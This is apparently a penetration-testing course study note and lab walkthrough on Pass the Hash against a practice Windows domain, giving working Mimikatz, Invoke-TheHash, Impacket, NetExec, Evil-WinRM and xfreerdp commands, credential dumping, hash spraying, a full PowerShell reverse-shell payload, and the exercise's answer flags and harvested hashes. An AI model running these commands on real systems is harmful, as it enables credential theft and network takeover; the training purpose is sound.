# Pass the Hash (PtH)

> **Module Section:** 20 / 26 — Password Attacks

## Overview

**Pass the Hash (PtH)** is an attack where an attacker uses a password hash instead of the actual password to authenticate. The attacker never needs to crack the hash. PtH works because the authentication protocol (NTLM) uses the hash itself as proof of identity. The hash stays the same until the user changes their password.

---

## How Hashes Are Obtained

The attacker must have **administrative or specific privileges** on the target to obtain a password hash:

| Source | Description |
|--------|-------------|
| **Local SAM database** | Dump hashes from a compromised host |
| **NTDS database (`ntds.dit`)** | Extract hashes from a Domain Controller |
| **LSASS memory (`lsass.exe`)** | Pull hashes from memory |

### Example Scenario
- **Target Hash:** `64F12CDDAA88057E06A81B54E73B949B`
- **Target Account:** `julio`
- **Domain:** `inlanefreight.htb`

> 💡 Lab tooling located at `C:\tools` on MS01. Pivot from MS01 → DC01.

---

## Windows NTLM Background

**NTLM** (New Technology LAN Manager) is Microsoft's set of security protocols that authenticate users via a challenge-response mechanism. No password is ever sent over the network directly.

| Property | Detail |
|----------|--------|
| **SSO** | Single Sign-On capable |
| **Current status** | Still supported for legacy compatibility |
| **Replacement** | **Kerberos** (default since Windows 2000 / AD) |
| **Critical flaw** | Passwords on server/DC are **not salted** — hash alone is sufficient for auth |

> ⚠️ Because NTLM hashes are not salted, an attacker with the hash can authenticate without ever knowing the password. This is the foundation of the PtH attack.

---

## PtH from Windows

### Mimikatz — `sekurlsa::pth`

Starts a new process (usually cmd.exe) running under the target user's identity using their NTLM hash — no password needed.

#### Required Parameters

| Parameter | Purpose |
|-----------|---------|
| `/user` | Username to impersonate |
| `/rc4` or `/NTLM` | NTLM hash |
| `/domain` | Target domain (use `.`, `localhost`, or computer name for local accounts) |
| `/run` | Process to launch (defaults to `cmd.exe`) |

#### Command

```cmd
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
> Spawns a new cmd.exe process authenticated as julio using the NTLM hash. Commands run in that new window have julio's network access — including shares on the DC.

#### Result
A new `cmd.exe` runs with `julio`'s context — allowing access to resources like `\\DC\julio` share.

---

### Invoke-TheHash (PowerShell)

A set of PowerShell functions for PtH attacks via WMI (Windows Management Instrumentation) and SMB. It passes the NTLM hash through the NTLMv2 protocol using .NET TCP connections. No local admin is needed on the attacker machine — but the target account must have admin rights on the destination host.

| Requirement | Detail |
|-------------|--------|
| **Client-side** | Local admin **NOT** required |
| **Target-side** | User/hash must have **admin rights** on target |

#### Parameters

| Parameter | Purpose |
|-----------|---------|
| `-Target` | Hostname or IP of target |
| `-Username` | User for authentication |
| `-Domain` | Auth domain (omit for local or `@domain` syntax) |
| `-Hash` | NTLM hash (`LM:NTLM` or `NTLM` format) |
| `-Command` | Command to execute (omit to just test WMI access) |

#### SMB Exec Example — Create Admin User

```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb `
    -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B `
    -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```
> Imports the module and runs a command on the target via SMB using julio's hash. The `-Command` here creates a local admin account named mark. Use any command you need in that field.

#### WMI Exec Example — Reverse Shell

1. Start a listener on attacker box (`172.16.1.5`):

   ```powershell
   PS C:\tools> .\nc.exe -lvnp 8001
   ```
   > Starts a netcat listener on port 8001. The reverse shell from DC01 will connect back here.

2. Generate a base64 PowerShell payload at [revshells.com](https://www.revshells.com) (PowerShell #3 Base64).

3. Execute via WMI (hostname `DC01` works as well as IP):

   ```powershell
   PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb `
       -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B `
       -Command "powershell -e <BASE64_PAYLOAD>"
   ```
   > Executes the base64-encoded PowerShell payload on DC01 via WMI using julio's hash. The reverse shell in the payload calls back to the listener you started in step 1.

Result: Reverse shell from DC01 → attacker machine.

---

## PtH from Linux

### Impacket

Impacket provides several tools for PtH attacks from Linux. Each tool uses a different protocol, offering different trade-offs between noise and functionality.

#### `impacket-psexec`

```bash
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
> Authenticates as Administrator using the NTLM hash (format is `LM:NTLM` — use an empty LM field with just the colon). Uploads a service binary to ADMIN$ and starts it, giving a SYSTEM shell.

Output:
```
[*] Found writable share ADMIN$
[*] Uploading file SLUBMRXK.exe
[*] Opening SVCManager on 10.129.201.126.....
[*] Starting service AdzX.....
C:\Windows\system32>
```

#### Other Impacket Execution Tools

| Tool | Protocol | Stealth |
|------|----------|---------|
| `impacket-psexec` | SMB (service creation) | 🔴 Noisy |
| `impacket-wmiexec` | WMI | 🟡 Quieter |
| `impacket-atexec` | Task Scheduler | 🟡 Quieter |
| `impacket-smbexec` | SMB (alternative) | 🟡 Quieter |

> 💡 **Hash format:** `LM:NTLM` — use blank LM (`:<NTLM>`) when only NTLM is known.

---

### NetExec (`nxc`)

NetExec automates Active Directory assessment. It is great for password spraying and for finding hosts where a hash grants access.

#### Spray Hash Across a Subnet

```bash
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```
> Sprays the NTLM hash across every host in the subnet. `-d .` uses local account authentication. Hosts showing `(Pwn3d!)` accept the hash — those are targets for further exploitation.

Output:
```
SMB  172.16.1.10  445  DC01  [-] .\Administrator:... STATUS_LOGON_FAILURE
SMB  172.16.1.5   445  MS01  [+] .\Administrator ... (Pwn3d!)
```

| Flag | Purpose |
|------|---------|
| `-d .` | Use local auth domain |
| `-H <hash>` | NTLM hash |
| `--local-auth` | Force local account authentication across the subnet |
| `-x <cmd>` | Execute a command on successful hosts |

#### Execute Command

```bash
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```
> Executes a command on the remote host using the hash. `-x` runs the command and prints the output. Useful for confirming access or quickly reading files without a full shell.

> ⚠️ **Lockout risk:** Password spraying can lock domain accounts. Check the domain lockout policy first. Use `--local-auth` to avoid domain-wide lockouts.

> 💡 **Real-world fix:** Recommend **LAPS (Local Administrator Password Solution)** to randomize and rotate local admin passwords.

---

### Evil-WinRM

Use Evil-WinRM for PtH over WinRM (Windows Remote Management) when SMB is blocked.

```bash
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```
> Opens an interactive PowerShell session on the target using the NTLM hash. `-H` takes just the NTLM portion. For domain accounts, use the UPN format: `administrator@inlanefreight.htb`.

> 💡 For domain accounts, use the UPN format: `administrator@inlanefreight.htb`

---

### xfreerdp — PtH over RDP

Use xfreerdp to gain GUI access to the target via PtH.

#### Caveat — Restricted Admin Mode

Restricted Admin Mode must be enabled on the target. Otherwise RDP will fail with an error about account restrictions. Enable it first via the registry before connecting.

```cmd
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
> Enables Restricted Admin Mode on the target by setting the registry key to 0. Run this via a command-exec method (NetExec `-x`, psexec, etc.) before attempting PtH RDP.

#### Connect

```bash
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```
> Connects via RDP using the NTLM hash instead of a password. `/pth:` takes the hash directly. Requires Restricted Admin Mode to be enabled on the target first.

---

## UAC Limits PtH for Local Accounts

**UAC (User Account Control)** restricts local accounts from performing remote administration tasks.

### Registry Key: `LocalAccountTokenFilterPolicy`

Path: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`

| Value | Effect |
|-------|--------|
| `0` (default) | **Only RID-500** (built-in Administrator) can do remote admin |
| `1` | All local admin accounts permitted to do remote admin |

### Exception: `FilterAdministratorToken`

When enabled (value `1`, disabled by default), **RID-500 is enrolled in UAC protection** — even if renamed — breaking remote PtH using that account.

> 💡 **Domain accounts are exempt** — these UAC restrictions only apply to local accounts. A domain account with admin rights on a box can always PtH to it.

📖 **Further reading:** [Will Schroeder — *Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy*](https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)

---

## Tool Comparison

| Tool | Platform | Protocol | Strength |
|------|----------|----------|----------|
| **Mimikatz** | Windows | Kerberos/NTLM via process injection | Local impersonation as `julio` |
| **Invoke-TheHash** | Windows | SMB / WMI | Lateral movement without local admin client-side |
| **Impacket** | Linux | SMB / WMI / RPC | Wide toolkit for PtH |
| **NetExec** | Linux | SMB / WinRM / etc. | Mass auth testing + command exec |
| **Evil-WinRM** | Linux | WinRM | Interactive shell when SMB blocked |
| **xfreerdp** | Linux | RDP | GUI access (needs Restricted Admin Mode) |

---

## Key Takeaways

1. **PtH exploits the protocol, not the hash** — no cracking needed
2. NTLM hashes are **not salted**, making PtH trivially possible
3. Three main hash sources: **SAM**, **NTDS.dit**, **LSASS memory**
4. From Windows: **Mimikatz** (local impersonation) + **Invoke-TheHash** (remote SMB/WMI)
5. From Linux: **Impacket**, **NetExec**, **Evil-WinRM**, **xfreerdp** cover every major protocol
6. **UAC (`LocalAccountTokenFilterPolicy`)** limits PtH for local accounts — only RID-500 works by default
7. **Domain admin accounts bypass** UAC restrictions for remote admin
8. **LAPS** is the recommended defensive control against hash reuse
9. For RDP PtH, **Restricted Admin Mode** must be enabled on target
10. Watch for **account lockouts** when spraying — use `--local-auth` where possible

---

## Exercise

### Exercise Answers

| # | Question | Answer |
|---|----------|--------|
| 1 | Contents of `C:\pth.txt` (PtH as `Administrator`) | `G3t_4CCE$$_V1@_PTH` |
| 2 | Registry value to enable PtH over RDP (set to `0`) | `DisableRestrictedAdmin` |
| 3 | David's NTLM/RC4 hash (Mimikatz `sekurlsa::logonpasswords`) | `c39f2beb3d2ec06a62cb887fb391dee0` |
| 4 | Contents of `\\DC01\david\david.txt` (PtH as david) | `D3V1d_Fl5g_is_Her3` |
| 5 | Contents of `\\DC01\julio\julio.txt` (PtH as julio) | `JuL1()_SH@re_fl@g` |
| 6 | Contents of `C:\julio\flag.txt` on DC01 (Invoke-WMIExec rev shell) | `JuL1()_N3w_fl@g` |

---

## Walkthrough — Full PtH Chain on `inlanefreight.htb`

This walks through the full attack from the external attacker to DC01 using Mimikatz, NetExec, xfreerdp, and Invoke-TheHash.

### Lab Topology

| Host | Internal IP | External IP | Role |
|---|---|---|---|
| Kali (attacker) | n/a | n/a | Source |
| MS01 | `172.16.1.5` | `10.129.204.23` | Member server (entry point) |
| DC01 | `172.16.1.10` | (internal only) | Domain Controller — **only reachable from MS01** |

Starting credential: local `Administrator` NTLM hash on MS01 → `30B3783CE2ABF1AF70F77D0660CF3453`

### Step 1 — PtH read of a flag file (NetExec one-shot)

```bash
nxc smb 10.129.204.23 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453 \
    --local-auth -x "type C:\pth.txt"
```
> Reads a file on the remote host using the NTLM hash. `--local-auth` forces local account authentication. A `(Pwn3d!)` result confirms local admin access.

✅ → `G3t_4CCE$$_V1@_PTH` (also confirms `(Pwn3d!)` — local admin via PtH).

### Step 2 — Enable Restricted Admin Mode for RDP PtH

By default xfreerdp PtH fails on Windows with *"Account restrictions prevent signing in..."*. Toggle the registry:

```bash
nxc smb 10.129.204.23 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453 --local-auth \
  -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```
> Enables Restricted Admin Mode on the target by running the reg command via PtH. This must be done before the xfreerdp PtH connection will work.

Then connect RDP with the hash:

```bash
xfreerdp /v:10.129.204.23 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
```
> Connects via RDP using the NTLM hash. Opens a full desktop session as Administrator without knowing the password.

> 🔑 Registry value: **`DisableRestrictedAdmin`** (set to `0` to allow PtH RDP).

### Step 3 — Dump cached creds with Mimikatz inside RDP

In PowerShell, `mimikatz.exe` won't run from `cd` — must prefix with `.\`:

```powershell
cd C:\tools
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```
> Dumps all cached logon credentials from LSASS. Look for `User Name : david` (and other accounts) in the output and copy their NTLM hash values.

Look for the `User Name : david` block — copy the `NTLM` value.
This box yielded:
- `david` → `c39f2beb3d2ec06a62cb887fb391dee0`
- `julio` → `64f12cddaa88057e06a81b54e73b949b`
- `john` → `c4b0e1b10c7ce2c4723b4e2407ef81a2`

### Step 4 — PtH spawn shell as david → read `\\DC01\david\david.txt`

In RDP cmd:
```cmd
C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:david /domain:inlanefreight.htb /ntlm:c39f2beb3d2ec06a62cb887fb391dee0 /run:cmd.exe" exit
```
> Spawns a new cmd.exe running as david using his NTLM hash. Run file access commands in the new window that appears, not in the original one.

A second cmd window opens; in **that** window:
```cmd
type \\DC01\david\david.txt
```
✅ → `D3V1d_Fl5g_is_Her3`

### Step 5 — Repeat for julio → read `\\DC01\julio\julio.txt`

```cmd
C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:julio /domain:inlanefreight.htb /ntlm:64f12cddaa88057e06a81b54e73b949b /run:cmd.exe" exit
```
> Same PtH spawn as Step 4, this time as julio. A new cmd window opens authenticated as julio.

```cmd
type \\DC01\julio\julio.txt
```
✅ → `JuL1()_SH@re_fl@g`

### Step 6 — Lateral move to DC01 via Invoke-TheHash + reverse shell

DC01 has **no route to the attacker box** — only to MS01 (`172.16.1.5`). So the listener must run **on MS01**, and the rev-shell payload must call back to MS01's internal IP.

#### 6a. Generate base64 PowerShell rev-shell payload (on Kali)

```bash
PAYLOAD='$client = New-Object System.Net.Sockets.TCPClient("172.16.1.5",8001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
echo -n "$PAYLOAD" | iconv -t UTF-16LE | base64 -w0
```
> Builds a PowerShell reverse shell payload and base64-encodes it for use with `powershell -e`. The `-w0` flag prevents line wrapping. Paste the output as the value for the `-Command` parameter in the next step.

> ⚠️ **Common typo:** I once wrote `$sendbyte = ([text.encoding]::ASCII).GetBytes($sendbyte2)` — must be `$sendback2`. The connection will succeed but no command output returns. Always verify the variable names match.

#### 6b. Start nc listener on MS01 (in a new cmd window inside RDP)

```powershell
cd C:\tools
.\nc.exe -lvnp 8001
```
> Starts a netcat listener on MS01's internal IP. DC01 can only route to MS01, so the reverse shell must call back to MS01 — not the attacker's external IP.

#### 6c. PtH spawn PowerShell as julio (in original RDP cmd)

```cmd
C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:julio /domain:inlanefreight.htb /ntlm:64f12cddaa88057e06a81b54e73b949b /run:powershell.exe" exit
```
> Spawns a new PowerShell window running as julio. Use this window (not the original) to load Invoke-TheHash and launch the WMI exec against DC01.

#### 6d. In the spawned PS, fire Invoke-TheHash → DC01

```powershell
cd C:\tools\Invoke-TheHash
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio `
  -Hash 64f12cddaa88057e06a81b54e73b949b `
  -Command "powershell -e <BASE64_PAYLOAD>"
```
> Runs the base64 payload on DC01 via WMI using julio's hash. Paste your actual base64 payload in place of `<BASE64_PAYLOAD>`. The command returns immediately — the reverse shell appears in the nc listener within a few seconds.

Output: `[+] Command executed with process ID <pid> on DC01`

#### 6e. Catch the shell + read flag

In the nc window:
```
connect to [172.16.1.5] from (UNKNOWN) [172.16.1.10] 49763
type C:\julio\flag.txt
JuL1()_N3w_fl@g
```

✅ Full DC01 compromise via chained PtH + Invoke-TheHash.

---

### Lessons Learned

1. **NetExec `--local-auth -x`** is the fastest one-shot method for PtH file reads. No shell needed.
2. **`DisableRestrictedAdmin = 0`** is required server-side for `xfreerdp /pth:` to work.
3. **PowerShell doesn't auto-run executables from CWD** — always prefix with `.\` (`.\mimikatz.exe`, `.\nc.exe`).
4. **Mimikatz `sekurlsa::pth` spawns a NEW window** running as the impersonated user. Run share/file commands in *that* window, not the original.
5. **Pivoting to an isolated DC**: when DC01 only routes to MS01, the listener must live on MS01 and the payload must target MS01's internal IP (`172.16.1.5` here, not the attacker's IP).
6. **Invoke-TheHash returns** `Command executed with process ID N` immediately — confirmation only that the WMI exec succeeded; the rev shell appears in the listener seconds later.
7. **Verify rev-shell payloads carefully** — typos like `$sendbyte2` vs `$sendback2` produce a "live" connection where commands run but no output returns.
8. **Hashes harvested from `sekurlsa::logonpasswords`** = every cached interactive/service logon — reuse them across the domain via Invoke-TheHash, NetExec, or Impacket.

---

## References

- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
- [Invoke-TheHash GitHub](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [Impacket GitHub](https://github.com/fortra/impacket)
- [NetExec Wiki](https://www.netexec.wiki/)
- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
- [revshells.com](https://www.revshells.com)
